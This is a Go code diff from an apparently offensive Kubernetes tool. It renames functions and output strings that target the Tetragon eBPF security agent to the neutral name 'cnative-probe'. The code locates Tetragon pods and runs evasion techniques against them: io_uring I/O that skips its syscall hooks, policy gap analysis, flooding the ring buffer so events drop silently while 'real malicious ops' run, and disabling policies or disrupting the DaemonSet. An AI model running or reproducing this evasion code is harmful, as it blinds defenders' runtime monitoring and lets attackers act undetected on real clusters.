@@ -20,7 +20,7 @@ var tracingPolicyGVR = schema.GroupVersionResource{
 	Group: "cilium.io", Version: "v1alpha1", Resource: "tracingpolicies",
 }
 
-func detectTetragon(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
+func detectCnativeProbe(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
 	namespaces := []string{"kube-system", "cilium", "tetragon"}
 	for _, ns := range namespaces {
 		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
@@ -28,10 +28,10 @@ func detectTetragon(ctx context.Context, client kubernetes.Interface) []Detectio
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "tetragon",
+				Name:      "cnative-probe",
 				Detected:  true,
 				Namespace: ns,
-				Details:   fmt.Sprintf("%d tetragon agent pods", len(pods.Items)),
+				Details:   fmt.Sprintf("%d cnative-probe agent pods", len(pods.Items)),
 			}}
 		}
 	}
@@ -41,51 +41,51 @@ func detectTetragon(ctx context.Context, client kubernetes.Interface) []Detectio
 	})
 	if err == nil && len(pods.Items) > 0 {
 		return []DetectionSystem{{
-			Name:      "tetragon",
+			Name:      "cnative-probe",
 			Detected:  true,
 			Namespace: pods.Items[0].Namespace,
-			Details:   fmt.Sprintf("%d tetragon pods across namespaces", len(pods.Items)),
+			Details:   fmt.Sprintf("%d cnative-probe pods across namespaces", len(pods.Items)),
 		}}
 	}
 
 	return nil
 }
 
-// EvadeTetragon executes the specified Tetragon evasion technique.
-func EvadeTetragon(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
+// EvadeCnativeProbe executes the specified cnative-probe evasion technique.
+func EvadeCnativeProbe(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
 	switch technique {
 	case "io_uring":
-		return tetragonIOUring(ctx)
+		return cnativeProbeIOUring(ctx)
 	case "policy_gaps":
-		return tetragonPolicyGaps(ctx, dynClient)
+		return cnativeProbePolicyGaps(ctx, dynClient)
 	case "ringbuf_flood":
-		return tetragonRingbufFlood(ctx)
+		return cnativeProbeRingbufFlood(ctx)
 	case "disable_policy":
-		return tetragonDisablePolicy(ctx, dynClient)
+		return cnativeProbeDisablePolicy(ctx, dynClient)
 	default:
-		return tetragonIOUring(ctx)
+		return cnativeProbeIOUring(ctx)
 	}
 }
 
-func tetragonIOUring(_ context.Context) (*EvasionResult, error) {
+func cnativeProbeIOUring(_ context.Context) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Tetragon io_uring Bypass:\n\n")
+	sb.WriteString("cnative-probe io_uring Bypass:\n\n")
 
-	sb.WriteString("  Tetragon hooks syscalls via kprobes/tracepoints.\n")
+	sb.WriteString("  cnative-probe hooks syscalls via kprobes/tracepoints.\n")
 	sb.WriteString("  io_uring submits I/O operations via shared ring buffers,\n")
-	sb.WriteString("  bypassing the normal syscall path that Tetragon monitors.\n\n")
+	sb.WriteString("  bypassing the normal syscall path that cnative-probe monitors.\n\n")
 
 	sb.WriteString("  Bypassed operations via io_uring:\n")
 	sb.WriteString("    - IORING_OP_OPENAT  (file open without open/openat kprobe)\n")
 	sb.WriteString("    - IORING_OP_READ    (file read without read/pread64 kprobe)\n")
 	sb.WriteString("    - IORING_OP_WRITE   (file write without write/pwrite64 kprobe)\n")
 	sb.WriteString("    - IORING_OP_CONNECT (network connect without connect kprobe)\n")
-	sb.WriteString("    - IORING_OP_SOCKET  (socket creation invisible to Tetragon)\n\n")
+	sb.WriteString("    - IORING_OP_SOCKET  (socket creation invisible to cnative-probe)\n\n")
 
 	supported := checkIOUringSupport()
 	if supported {
 		sb.WriteString("  [+] io_uring supported on this kernel\n")
-		sb.WriteString("  [+] Can perform file and network I/O invisible to Tetragon\n")
+		sb.WriteString("  [+] Can perform file and network I/O invisible to cnative-probe\n")
 	} else {
 		sb.WriteString("  [-] io_uring not available (kernel < 5.1 or seccomp blocked)\n")
 		sb.WriteString("  Fallback: use memfd_create + /proc/self/mem for fileless ops\n")
@@ -110,19 +110,19 @@ func checkIOUringSupport() bool {
 	return errno != syscall.ENOSYS
 }
 
-func tetragonPolicyGaps(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeProbePolicyGaps(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Tetragon TracingPolicy Gap Analysis:\n\n")
+	sb.WriteString("cnative-probe TracingPolicy Gap Analysis:\n\n")
 
 	policies, err := dynClient.Resource(tracingPolicyGVR).List(ctx, metav1.ListOptions{})
 	if err != nil {
 		sb.WriteString("  Could not list TracingPolicies (CRD not installed or no permission)\n")
-		sb.WriteString("  If Tetragon is using embedded policies, they may not be visible as CRDs\n")
+		sb.WriteString("  If cnative-probe is using embedded policies, they may not be visible as CRDs\n")
 		return &EvasionResult{Technique: "policy_gaps", Success: false, Output: sb.String()}, nil
 	}
 
 	if len(policies.Items) == 0 {
-		sb.WriteString("  No TracingPolicy CRDs found — Tetragon may use default/embedded policies only\n")
+		sb.WriteString("  No TracingPolicy CRDs found — cnative-probe may use default/embedded policies only\n")
 		sb.WriteString("  Default coverage: process exec, file access, network connect\n")
 		sb.WriteString("  Gaps in default policy:\n")
 		sb.WriteString("    - io_uring operations\n")
@@ -198,11 +198,11 @@ func tetragonPolicyGaps(ctx context.Context, dynClient dynamic.Interface) (*Evas
 	}, nil
 }
 
-func tetragonRingbufFlood(_ context.Context) (*EvasionResult, error) {
+func cnativeProbeRingbufFlood(_ context.Context) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Tetragon Ringbuf Flood:\n\n")
+	sb.WriteString("cnative-probe Ringbuf Flood:\n\n")
 
-	sb.WriteString("  Tetragon uses BPF perf/ring buffers to send events to userspace.\n")
+	sb.WriteString("  cnative-probe uses BPF perf/ring buffers to send events to userspace.\n")
 	sb.WriteString("  Buffer overflow causes event drops — lost events are silent.\n\n")
 
 	floodDir := "/tmp/.kd_tetragon_flood"
@@ -239,7 +239,7 @@ func tetragonRingbufFlood(_ context.Context) (*EvasionResult, error) {
 
 	sb.WriteString("  If ringbuf capacity (default 63 pages = ~256KB) is exceeded:\n")
 	sb.WriteString("    - Events are silently dropped\n")
-	sb.WriteString("    - Tetragon metric: tetragon_events_lost_total increases\n")
+	sb.WriteString("    - cnative-probe metric: tetragon_events_lost_total increases\n")
 	sb.WriteString("    - No alert generated for dropped events by default\n\n")
 
 	sb.WriteString("  Timing: execute real malicious ops during flood window\n")
@@ -252,9 +252,9 @@ func tetragonRingbufFlood(_ context.Context) (*EvasionResult, error) {
 	}, nil
 }
 
-func tetragonDisablePolicy(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
+func cnativeProbeDisablePolicy(ctx context.Context, dynClient dynamic.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Tetragon Policy Disable/Modify:\n\n")
+	sb.WriteString("cnative-probe Policy Disable/Modify:\n\n")
 
 	policies, err := dynClient.Resource(tracingPolicyGVR).List(ctx, metav1.ListOptions{})
 	if err != nil {
@@ -288,10 +288,10 @@ func tetragonDisablePolicy(ctx context.Context, dynClient dynamic.Interface) (*E
 	}, nil
 }
 
-// DisruptTetragon identifies and reports disruption vectors for Tetragon DaemonSets.
-func DisruptTetragon(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+// DisruptCnativeProbe identifies and reports disruption vectors for cnative-probe DaemonSets.
+func DisruptCnativeProbe(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Tetragon DaemonSet Disruption:\n\n")
+	sb.WriteString("cnative-probe DaemonSet Disruption:\n\n")
 
 	namespaces := []string{"kube-system", "cilium", "tetragon"}
 	found := false
@@ -323,7 +323,7 @@ func DisruptTetragon(ctx context.Context, client kubernetes.Interface) (*Evasion
 	}
 
 	if !found {
-		sb.WriteString("  No tetragon DaemonSet found\n")
+		sb.WriteString("  No cnative-probe DaemonSet found\n")
 	}
 
 	sb.WriteString("\n  Disruption techniques:\n")
@@ -335,7 +335,7 @@ func DisruptTetragon(ctx context.Context, client kubernetes.Interface) (*Evasion
 	sb.WriteString("    - Fill /sys/fs/bpf mount to prevent new program pins\n")
 
 	return &EvasionResult{
-		Technique: "disrupt_tetragon",
+		Technique: "disrupt_cnative_probe",
 		Success:   found,
 		Output:    sb.String(),
 	}, nil
